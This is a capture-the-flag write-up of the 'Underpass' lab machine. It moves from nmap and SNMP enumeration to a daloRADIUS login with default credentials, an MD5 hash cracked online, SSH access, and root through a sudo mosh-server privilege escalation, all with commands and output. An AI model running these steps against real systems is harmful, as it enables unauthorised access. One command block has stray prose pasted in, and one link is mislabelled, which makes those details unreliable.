## Scanning
### Passive
```
┌──(oriol㉿zero)-[~/underpass]
└─$ ping -c1 10.10.11.48   
PING 10.10.11.48 (10.10.11.48) 56(84) bytes of data.
64 bytes from 10.10.11.48: icmp_seq=1 ttl=63 time=45.1 ms

--- 10.10.11.48 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.148/45.148/45.148/0.000 ms
```

With this ping, looking at the TTL we can assume that the machine is a linux, as it is very 
close to 64, if it was a Windows, the TTL should be close to 128.

With `wget` i confirm there is a web page running on http:
```
┌──(oriol㉿zero)-[~/underpass]
└─$ wget http://10.10.11.48      
--2025-01-28 20:26:55--  http://10.10.11.48/
Connecting to 10.10.11.48:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10671 (10K) [text/html]
Saving to: ‘index.html’

index.html                                                 100%[========================================================================================================================================>]  10.42K  --.-KB/s    in 0s      

2025-01-28 20:26:55 (979 MB/s) - ‘index.html’ saved [10671/10671]
```

Looking at the web via browser, it is the default apache page:
![[underpass01.png]]

So now we know it has apache2 and is an Ubuntu.

No https
```
┌──(oriol㉿zero)-[~/underpass]
└─$ wget https://10.10.11.48
--2025-01-28 20:28:38--  https://10.10.11.48/
Connecting to 10.10.11.48:443... failed: Connection refused.
```

It has ssh:
```
┌──(oriol㉿zero)-[~]
└─$ ssh root@10.10.11.48 
The authenticity of host '10.10.11.48 (10.10.11.48)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.48' (ED25519) to the list of known hosts.
root@10.10.11.48's password:
```

No smb:
```
┌──(oriol㉿zero)-[~]
└─$ smbclient -L 10.10.11.48   
do_connect: Connection to 10.10.11.48 failed (Error NT_STATUS_CONNECTION_REFUSED)
```

No ftp:
```
┌──(oriol㉿zero)-[~]
└─$ ftp 10.10.11.48   
ftp: Can't connect to `10.10.11.48:21': Connection refused
ftp: Can't connect to `10.10.11.48:ftp'
ftp> 
```

It doesn't have exposed SQL on the default port at least:
```
┌──(oriol㉿zero)-[~]
└─$ mysql -h 10.10.11.48                   
ERROR 2002 (HY000): Can't connect to server on '10.10.11.48' (115)
```

Pretty disappointing passive scan, let's see if the active goes better.

### Active
As always, I do all the ports with the `-p` flag and do a more deep scan with the `-sC` and `-sV` flags, which use the default scripts and enumerate versions, respectivelly.

```
┌──(oriol㉿zero)-[~], I will add the `-sU` tag. Maybe this way we encounter some └─$ nmap -sC -sV -p- -Pn 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 12:34 CET
Nmap scan report for 10.10.11.48
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds
```

We got the versions of the services encountered earlier.
- **OpenSSH:** 8.9p1
- **Apache2:** 2.4.52

The versions are quite new, if not the latest. There isn't any CVE we can exploit right now.

Let's keep scanning, because right now we don't have anything we can exploit.

I will change a little the nmap scan so that it scans also UDP services, I will add the `-sU` tag. Maybe this way we encounter some more services. It will take quite a long time, I will also change the command so that it only scans the top 150 most used ports with the `--top-ports 150` flag.
```
┌──(oriol㉿zero)-[~]
└─$ nmap --top-ports 150 -sU -Pn 10.10.11.48 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 12:59 CET
Nmap scan report for 10.10.11.48
Host is up (0.047s latency).
Not shown: 147 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct

Nmap done: 1 IP address (1 host up) scanned in 171.95 seconds
```

Yes, we got some new services running on the machine, the state opened|filtered means that nmap couldn't determine if it is really opened, maybe because of firewall issues.

While the nmap scan is working, I will do a little of web fuzzing with the **fuff** tool, I select which part of the URL fuzz by adding FUZZ, and select a default wordlist, and also set it to follow the redirects with the `-r` flag.
```
┌──(oriol㉿zero)-[~]
└─$ ffuf -u http://10.10.11.48/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.48/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# Copyright 2007 James Fisher [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 44ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 44ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 44ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 45ms]
# on atleast 2 different hosts [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 46ms]
                        [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3199ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3199ms]
#                       [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3201ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3201ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3201ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3201ms]
#                       [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3968ms]
#                       [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3976ms]
#                       [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3982ms]
                        [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 43ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 43ms]
:: Progress: [220560/220560] :: Job [1/1] :: 2347 req/sec :: Duration: [0:01:45] :: Errors: 0 ::
```

No luck with web fuzzing.

So, let's work with the nmap results. We know it has snmp enabled. SNMP means Simple Network Managment Protocol, it is used to administrate all the network devices in a uniform way. This Incibe blog explains very well the protocol (spanish): https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS

As this is my first time with SNMP, I will be following this hacktricks page:
https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html

First of all, I will do a nmap scan on only the SNMP port to get more info, I will include the `-sC` and `-sV` flags, which I didn't put on the initial udp scan as it would have taken a long time to do all 150 ports.
```
┌──(oriol㉿zero)-[~]
└─$ nmap -p 161 -sC -sV -sU -Pn 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 13:44 CET
Nmap scan report for 10.10.11.48
Host is up (0.043s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 8h26m43s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 8h26m42.81s (3040281 timeticks)
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

We got some interesting information:
- The server supports the SNMP versions 1 and 3
- The community string (which is like the password) of the SNMPv3 is **public**
- The server is running the net snmp software
- The hostname of the server is **UnDerPass.tb**
- `is the only daloradius server in the basin!` suggest that this machine is running **DaloRadius** server, confirming the `1812/udp open|filtered radius` on the nmap scan.

I will use **snmpwalk** to get more information about the server, now that we have the community string:
```
┌──(oriol㉿zero)-[~]
└─$ snmpwalk -v 1 -c public 10.10.11.48 
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (3129560) 8:41:35.60
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (3130944) 8:41:49.44
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 02 02 0C 39 16 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 218
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
```

We got a user: steve@underpass.htb

I think we got all the info from SNMP without trying, let's go to the **radius** server.
Radius (**R**emote **A**uthentication **D**ial-**I**n **U**ser **S**ervice) is a server that in essence is used for authentication. It gets an input as credentials and then let's the client connect to it. This is used mainly by the IPSs.

Looking at the dalo radius github, it says it is a web management application. So maybe we can get to it if we enter via hostname.

So, let's add it to the hosts file.
```
┌──(oriol㉿zero)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       zero
10.10.11.48     underpass.htb
```

Looking at it, it goes to the apache default page:
![[underpass02.png]]

Maybe the page isn't on the default route, so apache doesn't show it as default when entering.

We could do more web fuzzing now that we have the hostname, but first I want to try to search on the web the default login page.

According to this page: https://kb.ct-group.com/radius-holding-post-watch-this-space/ the admin login is in this location: `http://<ip-address>/daloradius/app/operators`

Yup, we are on the login page:
![[underpass03.png]]

And we have the verison: **daloRADIUS 2.2 beta**

## Attack
I will try to follow the SNMP RCE page on hacktricks: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/snmp-rce.html

First, the server needs to have the **`NET-SNMP-EXTEND-MIB`** extension, which then can be used to execute arbitrary scripts.

So, let's try it with the snmpwalk command found on the hacktricks site, changing the parameters to adequate to our server.
```
┌──(oriol㉿zero)-[~]
└─$ snmpwalk -v 3 -c public 10.10.11.48 NET-SNMP-EXTEND-MIB::nsExtendObjects

MIB search path: /home/oriol/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
Cannot find module (SNMP-FRAMEWORK-MIB): At line 9 in /usr/share/snmp/mibs/NET-SNMP-AGENT-MIB.txt
```

Seems that this extension is not present on the server...

Let's go to the daloradius.

The version is 2.2 beta, maybe it has some exploitable CVE.

I see this XXS+CSRF exploit for verisons 1.3 and earler: https://github.com/lirantal/daloradius/security/advisories/GHSA-c9xx-6mvw-9v84

But, first let's try if daloradius has default admin credentials. On the installation wiki on the official github (https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS), it says this:
```
To log in to the RADIUS Management application, use the following default credentials:

- Username: `administrator`
- Password: `radius`
```

Let's try it.
![[underpass04.png]]

Lol, it worked.

On the users lists, there is some type of password hash, that maybe is from the steve user found earlier.
![[underpass05.png]]

According to hashes.com, seems to be a MD5
![[underpass06.png]]

So, before using john to bruteforce the hash, I will try to put it on the crackstation.net page, which uses rainbow tables for non salted hashes. This way is much faster than bruteforcing.
![[underpass07.png]]

And we got it, **underwaterfriends**

So now, let's try to log in via ssh with the user and password found.
```
┌──(oriol㉿zero)-[~]
└─$ ssh steve@underpass.htb
steve@underpass.htb's password: 
Permission denied, please try again.
```

No, then, let's try with the radius server user, which is **svcMosh**
```
┌──(oriol㉿zero)-[~]
└─$ ssh svcMosh@underpass.htb
svcMosh@underpass.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
```

Yes!
- **User:** svcMosh
- **Password:** underwaterfriends
### Privilege scalation
id of the user:
```
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
```

With `sudo -l` lists all the commands the current user can execute as root.
```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

Seems it's pretty clear that we have to use the **mosh-server** script, so let's take a look.
First of all, it's a compiled executable, so we won't get many information with a `cat` command.
```
svcMosh@underpass:~$ file /usr/bin/mosh-server
/usr/bin/mosh-server: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=26b56b88e14ea6edca803fb0309a81ed06a7e970, for GNU/Linux 3.2.0, stripped
```

Seems to be a remote administration shell:
https://mosh.org/

```
svcMosh@underpass:~$ /usr/bin/mosh-server


MOSH CONNECT 60001 a443PcoeMQj3OkRBxUA6gA

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 3397]
svcMosh@underpass:~$ /usr/bin/mosh-server -h
Usage: /usr/bin/mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
```

With a quick search I find this blog that explains how to escalate privileges with mosh: https://medium.com/@momo334678/mosh-server-sudo-privilege-escalation-82ef833bb246

So, first of all we need to execute mosh with sudo on the machine:
```
svcMosh@underpass:~$ sudo /usr/bin/mosh-server


MOSH CONNECT 60001 iNDE++OhTu7WvN3Xz4UtKg

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 4411]
```

And take note of the `MOSH CONNECT` line, which includes the port being used for mosh and the key to connect to it, respectively

Then, we will use the mosh client, which is already installed on the server.
```
svcMosh@underpass:~$ mosh
Usage: /usr/bin/mosh [options] [--] [user@]host [command...]
        --client=PATH        mosh client on local machine
                                (default: "mosh-client")
        --server=COMMAND     mosh server on remote machine
                                (default: "mosh-server")

        --predict=adaptive      local echo for slower links [default]
-a      --predict=always        use local echo even on fast links
-n      --predict=never         never use local echo
        --predict=experimental  aggressively echo even when incorrect

-4      --family=inet        use IPv4 only
-6      --family=inet6       use IPv6 only
        --family=auto        autodetect network type for single-family hosts only
        --family=all         try all network types
        --family=prefer-inet use all network types, but try IPv4 first [default]
        --family=prefer-inet6 use all network types, but try IPv6 first
-p PORT[:PORT2]
        --port=PORT[:PORT2]  server-side UDP port or range
                                (No effect on server-side SSH port)
        --bind-server={ssh|any|IP}  ask the server to reply from an IP address
                                       (default: "ssh")

        --ssh=COMMAND        ssh command to run when setting up session
                                (example: "ssh -p 2222")
                                (default: "ssh")

        --no-ssh-pty         do not allocate a pseudo tty on ssh connection

        --no-init            do not send terminal initialization string

        --local              run mosh-server locally without using ssh

        --experimental-remote-ip=(local|remote|proxy)  select the method for
                             discovering the remote IP address to use for mosh
                             (default: "proxy")

        --help               this message
        --version            version and copyright information

Please report bugs to mosh-devel@mit.edu.
Mosh home page: https://mosh.org
```

And the command to connect to the server is:
```
svcMosh@underpass:~$ MOSH_KEY=iNDE++OhTu7WvN3Xz4UtKg mosh-client 127.0.0.1 60001
```

And now we connected to the mosh instance created with root privileges, which means we are also root!
```
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## Solutions
- Disable default apache page to not give unnecessary information.
- Don't use the public community string on SNMP.
- Don't use SNMPv1 if not necessary.
- Don't expose unnecessary information via SNMP
- Never use the default credentials.
- If possible, configure daloradius to not store password in an insecure hash like MD5, and use salt and pepper.
- Don't let a normal user be able to execute programs like mosh with root.


Links used
---
- https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending
- https://medium.com/@momo334678/mosh-server-sudo-privilege-escalation-82ef833bb246
- https://mosh.org/
- https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS
- https://crackstation.net/
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html
-  https://book.hacktricks.wiki




